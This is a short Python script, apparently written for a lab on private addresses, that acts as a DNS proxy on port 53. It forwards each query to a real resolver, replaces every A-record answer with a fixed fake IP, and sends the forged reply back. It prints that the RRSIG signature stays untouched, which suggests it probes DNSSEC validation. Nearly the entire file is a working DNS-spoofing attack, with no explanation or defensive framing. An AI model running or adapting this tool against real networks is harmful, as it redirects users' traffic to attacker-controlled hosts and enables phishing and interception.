from scapy.all import *
import socket

REAL_DNS = "10.0.2.15"
FAKE_IP = "10.10.10.10"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", 53))
print("Escuchando en puerto 53...")

while True:
    try:
        data, addr = sock.recvfrom(512)
        request = DNS(data)

        real_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        real_sock.settimeout(5)
        real_sock.sendto(data, (REAL_DNS, 53))
        real_data, _ = real_sock.recvfrom(4096)
        real_sock.close()

        response = DNS(real_data)
        for i in range(response.ancount):
            if response.an[i].type == 1:
                response.an[i].rdata = FAKE_IP
                print(f"IP cambiada a {FAKE_IP}, RRSIG intacta")

        sock.sendto(bytes(response), addr)
    except Exception as e:
        print(f"Error: {e}, continuando...")
        continue
